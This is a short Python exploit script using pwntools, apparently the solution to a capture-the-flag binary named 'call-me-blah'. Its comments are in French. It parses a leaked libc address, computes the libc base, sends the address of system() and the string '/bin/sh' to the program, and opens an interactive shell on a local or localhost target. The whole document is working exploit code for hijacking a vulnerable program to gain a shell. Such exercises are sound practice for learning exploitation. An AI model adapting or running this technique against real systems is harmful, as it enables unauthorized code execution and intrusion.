from pwn import *

libc = ELF('./libc-2.36.so')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process('./call-me-blah_patched')

leak = int(io.recvline().strip(), 16) # strip enleve \n et autre. int(   ,16) interprete de l'hex
log.info(hex(leak))

libc.address = leak - libc.symbols['_IO_2_1_stdin_'] # gef➤  xinfo 0x7ffff7fb2a80
log.info(f'libc base = {hex(libc.address)}')

system = libc.symbols['system']
log.info(hex(system))

io.sendline(str(system).encode()) #str car c comme si on taper au clavier et encode pour que sendline envoie bien
io.sendline(b'/bin/sh')

io.interactive()